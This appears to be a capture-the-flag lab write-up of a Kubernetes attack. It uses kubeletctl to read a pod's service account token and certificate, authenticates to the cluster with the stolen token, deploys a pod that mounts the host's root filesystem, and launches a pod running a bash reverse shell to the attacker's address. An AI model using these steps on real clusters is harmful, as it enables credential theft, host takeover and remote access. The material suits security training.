____

ServiceAccount object, which is managed by Kubernets and provides identity within the pod. It gives three typical directories:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccout`

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration

```bash
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

With the `ca.crt` and the `token`, I can authenticate to the cluster.

```bash
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt

kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

## auth to kubernetes API

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

```bash
./kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
```

# Mount system

Create a pod (container) that has the root file system mapped into it. Then I can execute in the pod, and access the mapped volume, which is the full file system of the host.

```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: dani-pod
  namespace: default
spec:
  containers:
  - name: dani-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

The `name` is arbitrary. The `namespace` is the one I’ve been working out of, `default`. I’ll use the image that already exists here, `nginx:1.14.2`. The rest is just setting up the `volumes` / `volumeMounts`. The `volumeMount` says that I’m going to mount a `volume` named `hostfs` into the container at the mount point `/mnt`. Then that volume is defined as `/` on the host file system.

```bash
./kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```

host file system is mounted at `/mnt`:
```bash
kubeletctl exec "ls /mnt/" -s 10.10.11.133 -p dani-pod -c dani-pod
```


# Get shell

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: dani-pod2
  namespace: default
spec:
  containers:
  - name: dani-pod2
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
./kubectl apply -f evil-pod2.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
pod/dani-pod2 created
```
